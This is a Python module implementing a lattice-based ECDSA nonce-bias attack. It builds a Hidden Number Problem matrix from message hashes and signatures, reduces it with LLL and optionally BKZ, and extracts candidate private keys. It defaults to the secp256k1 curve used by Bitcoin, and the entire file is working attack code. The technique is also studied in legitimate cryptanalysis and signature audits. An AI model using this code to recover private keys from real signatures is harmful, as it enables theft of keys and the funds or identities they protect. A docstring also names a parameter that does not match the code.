"""Lattice construction and reduction for ECDSA nonce-bias attacks."""

from __future__ import annotations

import sys
from fractions import Fraction

import olll
from fpylll import BKZ, IntegerMatrix
from fpylll.algorithms.bkz import BKZReduction

# Default group order for the secp256k1 curve
DEFAULT_ORDER: int = (
    115792089237316195423570985008687907852837564279074904382605163141518161494337
)


def _modular_inv(a: int, b: int) -> int:
    """Return the modular inverse of *a* modulo *b*.

    Args:
        a: The integer to invert.
        b: The modulus.

    Returns:
        The modular inverse as an integer.

    Raises:
        ValueError: If *a* has no inverse modulo *b*.
    """
    return pow(a, -1, b)


def make_matrix(
    msgs: list[int],
    sigs: list[tuple[int, int]],
    pubs: list[str],  # noqa: ARG001
    b_param: int,
    order: int = DEFAULT_ORDER,
    matrix_type: str = "dense",  # noqa: ARG001
) -> list[list[int | Fraction]]:
    """Build the HNP lattice matrix for LLL-based private key recovery.

    Args:
        msgs: Message hashes as integers.
        sigs: List of ``(R, S)`` signature pairs as integers.
        pubs: Public-key strings (not used in construction; kept for API symmetry).
        B: Bit-width parameter controlling the lattice scaling
            (e.g. 176 for an 80-bit nonce bias on secp256k1).
        order: Curve group order.
        matrix_type: Currently only ``"dense"`` is supported; reserved for
            a future sparse variant.

    Returns:
        A 2-D list of integers / :class:`~fractions.Fraction` objects suitable
        for passing directly to :func:`reduce_matrix`.

    Raises:
        ValueError: If fewer than 2 signatures are provided.
    """
    m = len(msgs)
    if m < 2:
        raise ValueError(f"At least 2 signatures are required; got {m}.")

    sys.stderr.write(f"Using: {m} sigs...\n")

    m1 = m + 1
    matrix: list[list[int | Fraction]] = [[0] * m1 for _ in range(m - 1)]

    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
    mi_sn_order = _modular_inv(sn, order)
    rnsn_inv = rn * mi_sn_order
    mnsn_inv = msgn * mi_sn_order

    r1: list[int | Fraction] = []
    r2: list[int | Fraction] = []

    for i in range(m - 1):
        matrix[i][i] = order
        mi_sigi_order = _modular_inv(sigs[i][1], order)
        r1.append(int(sigs[i][0]) * mi_sigi_order - rnsn_inv)
        r2.append(int(msgs[i]) * mi_sigi_order - mnsn_inv)

    # Last two entries: scaling factor and sentinel
    r1.append(Fraction(2**b_param, order))
    r1.append(0)
    r2.append(0)
    r2.append(2**b_param)

    matrix.append(r1)
    matrix.append(r2)

    return matrix


def reduce_matrix(
    matrix: list[list[int | Fraction]],
    do_bkz: bool = False,
    delta: float = 0.75,
) -> list[list[int | Fraction]]:
    """Reduce a lattice matrix using LLL, optionally followed by BKZ.

    Args:
        matrix: The input lattice matrix as returned by :func:`make_matrix`.
        do_bkz: If ``True``, run a BKZ post-processing pass after LLL
            (block size 20, 8 max loops).
        delta: The LLL delta parameter (default ``0.75``).

    Returns:
        The reduced matrix in the same shape as *matrix*.
    """
    reduced: list[list[int | Fraction]] = olll.reduction(matrix, delta)

    if do_bkz:
        par = BKZ.Param(block_size=20, max_loops=8)
        int_matrix = IntegerMatrix.from_matrix(reduced)
        bkz = BKZReduction(int_matrix)
        bkz(par)
        # Convert back to list-of-lists so the return type is consistent
        reduced = [
            [int_matrix[r][c] for c in range(int_matrix.ncols)]
            for r in range(int_matrix.nrows)
        ]

    return reduced


def privkeys_from_reduced_matrix(
    msgs: list[int],
    sigs: list[tuple[int, int]],
    pubs: list[str],  # noqa: ARG001
    matrix: list[list[int | Fraction]],
    order: int = DEFAULT_ORDER,
) -> list[int]:
    """Extract candidate private keys from a reduced lattice matrix.

    Args:
        msgs: Original message hashes (same order as passed to :func:`make_matrix`).
        sigs: Original ``(R, S)`` pairs (same order).
        pubs: Public-key strings (unused; kept for API symmetry).
        matrix: Reduced lattice matrix from :func:`reduce_matrix`.
        order: Curve group order.

    Returns:
        A deduplicated list of candidate private keys as integers.
    """
    keys: list[int] = []
    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]

    for row in matrix:
        potential_nonce_diff = row[0]
        try:
            numerator = (
                sn * msgs[0]
                - sigs[0][1] * msgn
                - sigs[0][1] * sn * potential_nonce_diff
            )
            denominator = rn * sigs[0][1] - sigs[0][0] * sn
            potential_priv_key = numerator * _modular_inv(int(denominator), order)
            key = int(potential_priv_key) % order
            if key not in keys:
                keys.append(key)
        except Exception as exc:  # noqa: BLE001 — intentional broad catch
            sys.stderr.write(f"Error extracting key: {exc}\n")

    return keys
